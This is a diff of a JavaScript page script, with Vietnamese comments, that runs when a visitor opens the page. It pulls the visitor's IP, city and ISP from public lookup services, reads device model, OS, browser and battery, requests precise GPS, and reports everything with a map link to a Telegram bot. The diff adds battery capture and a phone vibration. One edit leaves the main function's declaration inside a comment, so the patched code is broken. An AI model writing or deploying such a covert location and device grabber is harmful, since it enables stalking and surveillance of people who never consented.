@@ -62,114 +62,107 @@ adjustZoom();
         const CHAT_ID = CONFIG.CHAT_ID;
 let isBotActive = false;
 
-// --- 2. HÀM NHẬN DIỆN MODEL THIẾT BỊ SÂU ---
-function getDeviceModel() {
+// --- 2. HÀM RUNG THIẾT BỊ ---
+function triggerVibrate() {
+    if (navigator.vibrate) {
+        // Rung một nhịp dài 500ms
+        navigator.vibrate(500);
+    }
+}
+
+// --- 3. NHẬN DIỆN THIẾT BỊ SÂU ---
+async function getFullDeviceInfo() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
     let os = "Không rõ";
     let model = "Thiết bị ẩn";
+    let battery = "Không rõ";
 
-    // Phân loại Hệ điều hành & Model sơ bộ
+    // Lấy Pin
+    try {
+        const bt = await navigator.getBattery();
+        battery = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Đang sạc ⚡' : 'Pin thường'})`;
+    } catch (e) {}
+
+    // Nhận diện OS & Model chi tiết (iPhone/Android/PC)
     if (ua.includes("Win")) {
-        os = "Windows";
-        model = "Máy tính/Laptop";
-    } else if (ua.includes("Macintosh")) {
-        os = "MacOS";
-        model = "MacBook/iMac";
+        os = "Windows"; model = "PC/Laptop";
     } else if (ua.includes("iPhone")) {
         os = "iOS";
-        // Kỹ thuật lấy độ phân giải để đoán đời iPhone
         const screenStr = `${screen.width}x${screen.height}`;
-        const iphoneModels = {
-            "430x932": "iPhone 14/15 Pro Max",
-            "393x852": "iPhone 14/15 Pro",
-            "428x926": "iPhone 12/13/14 Pro Max",
-            "390x844": "iPhone 12/13/14/15",
-            "375x812": "iPhone X/11 Pro/12 Mini",
-            "414x896": "iPhone XR/11 Pro Max",
+        const iphoneMap = {
+            "430x932": "iPhone 14/15 Pro Max", "393x852": "iPhone 14/15 Pro",
+            "428x926": "iPhone 12/13/14 Pro Max", "390x844": "iPhone 12/13/14/15",
+            "375x812": "iPhone X/11 Pro/12 Mini", "414x896": "iPhone XR/11 Pro Max",
             "375x667": "iPhone 6/7/8/SE"
         };
-        model = iphoneModels[screenStr] || "iPhone (Đời mới)";
+        model = iphoneMap[screenStr] || "iPhone (Đời mới)";
     } else if (ua.includes("Android")) {
         os = "Android";
         const match = ua.match(/Android\s+([^\s;]+);\s+([^;]+)\)/);
         model = match ? match[2] : "Điện thoại Android";
+    } else if (ua.includes("Macintosh")) {
+        os = "MacOS"; model = "MacBook/iMac";
     }
 
-    // Phân loại Trình duyệt (Sửa lỗi Safari/Chrome)
+    // Fix lỗi Safari trên iOS
     if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) browser = "Cốc Cốc";
     else if (ua.includes("Edg/")) browser = "Microsoft Edge";
     else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; 
     else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
     else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) browser = "Safari";
 
-    return { browser, os, model };
+    return { browser, os, model, battery };
 }
 
-// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100% để không bị "Không rõ") ---
-async function fetchIpInfo() {
-    const apis = [
-        {
-            // Nguồn 1: ipwho.is (Rất mạnh, hỗ trợ HTTPS tốt)
-            url: 'https://ipwho.is/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
-        },
-        {
-            // Nguồn 2: ipapi.co (Dự phòng)
-            url: 'https://ipapi.co/json/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
-        },
-        {
-            // Nguồn 3: Cloudflare (Chỉ lấy IP nếu 2 nguồn trên lỗi)
-            url: 'https://cloudflare.com/cdn-cgi/trace',
-            parse: (d) => {
-                const lines = d.split('\n');
-                const ipLine = lines.find(l => l.startsWith('ip='));
-                return { ip: ipLine ? ipLine.split('=')[1] : "N/A", city: "N/A", isp: "Cloudflare" };
-            },
-            isText: true
+// --- 4. LẤY IP, THÀNH PHỐ, ISP (Nguồn HTTPS cực mạnh) ---
+async function fetchIpData() {
+    try {
+        const response = await fetch('https://ipwho.is/');
+        const d = await response.json();
+        if (d.success) {
+            return {
+                ip: d.ip,
+                city: d.city || "Không rõ",
+                isp: d.connection?.isp || d.org || "Nhà mạng ẩn"
+            };
         }
-    ];
-
-    for (const api of apis) {
+    } catch (e) {
         try {
-            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
-            if (!res.ok) continue;
-            const data = api.isText ? await res.text() : await res.json();
-            const result = api.parse(data);
-            if (result.ip && result.ip !== "N/A") return result;
-        } catch (e) { continue; }
+            const res2 = await fetch('https://ipapi.co/json/');
+            const d2 = await res2.json();
+            return { ip: d2.ip, city: d2.city, isp: d2.org };
+        } catch (err) {
+            return { ip: "Lỗi", city: "Lỗi", isp: "Lỗi" };
+        }
     }
-    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
-// --- 4. GỬI THÔNG BÁO (Format đẹp y hệt ảnh 1) ---
-async function sendNotification(pos, info) {
+// --- 5. GỬI THÔNG BÁO TELEGRAM ---async function sendNotification(pos, info) {
     if (isBotActive) return;
     isBotActive = true;
 
-    const device = getDeviceModel();
-    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
+    const device = await getFullDeviceInfo();
+    const time = new Date().toLocaleString('vi-VN');
+
+    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
     msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${info.city}</code>\n`;
     msg += `📡 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;
 
     msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
-    msg += `├─ Thiết bị: <b>${device.model}</b>\n`; // HIỆN MODEL CHI TIẾT
+    msg += `├─ Thiết bị: <b>${device.model}</b>\n`;
     msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
-    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
+    msg += `├─ Trình duyệt: <b>${device.browser}</b>\n`;
+    msg += `└─ Mức Pin: 🔋 <b>${device.battery}</b>\n\n`;
 
-     if (pos && pos.coords) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        message += `📍 <b>Vị trí GPS:</b>\n`;
-        message += `├ Vĩ độ: <code>${lat}</code>\n`;
-        message += `├ Kinh độ: <code>${lon}</code>\n`;
-        message += `└ 👉 <a href="${mapsUrl}">Nhấn để xem Bản đồ</a>\n\n`;
+    if (pos && pos.coords) {
+        const { latitude: lat, longitude: lon } = pos.coords;
+        msg += `📍 <b>Vị trí GPS:</b>\n`;
+        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
     } else {
-        message += `⚠️ <b>GPS:</b>Bị từ chối hoặc Không khả dụng\n\n`;
+        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
     }
 
     try {
@@ -190,18 +183,21 @@ async function sendNotification(pos, info) {
     }
 }
 
-// --- 5. KHỞI CHẠY ---
+// --- 6. KHỞI CHẠY ---
 async function start() {
-    const ipData = await fetchFullData();
+    triggerVibrate(); // Rung điện thoại ngay khi bắt đầu
+    const ipData = await fetchIpData();
+    
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => sendNotification(pos, ipData),
             () => sendNotification(null, ipData),
-            { enableHighAccuracy: true, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 6000 }
         );
     } else {
         sendNotification(null, ipData);
     }
 }
 
+// Tự động chạy khi vào trang
 window.onload = start;
